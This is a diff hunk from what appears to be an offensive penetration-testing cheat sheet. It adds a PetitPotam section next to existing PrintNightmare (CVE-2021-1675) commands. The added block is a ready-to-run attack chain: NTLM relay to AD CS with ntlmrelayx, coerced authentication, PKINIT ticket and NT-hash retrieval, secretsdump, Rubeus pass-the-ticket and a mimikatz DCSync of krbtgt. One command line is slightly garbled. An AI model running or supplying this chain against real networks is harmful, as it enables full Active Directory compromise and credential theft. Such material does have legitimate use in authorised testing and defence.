@@ -859,6 +859,21 @@ $ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 $ sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<IP address> '\\<IP address>\CompData\backupscript.dll'
 ```
 
+- PetitPotam
+
+```
+https://github.com/topotam/PetitPotam
+$ sudo ntlmrelayx.py -debug -smb2support --target http://<hostname>/certsrv/certfnsh.asp --adcs --template DomainController
+$ python3 PetitPotam.py <Attacker IP address> <Domain Controller IP address>
+$ python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<machine account>\$ -pfx-base64 <base64 certificate> = dc01.ccache
+$ secretsdump.py -just-dc-user <domain>/<username> -k -no-pass "<machine account>$"@<hostname>
+$ klist
+$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 <domain>/<machine account>$
+$ secretsdump.py -just-dc-user <domain</administrator "<machine account>$"@<IP address> -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+C:\> .\Rubeus.exe asktgt /user:<machine account>$ /<base64 certificate>=/ptt
+mimikatz # lsadump::dcsync /user:<domain>\krbtgt
+```
+
 #4. - Lateral Movement
 -----------------------------------------
 
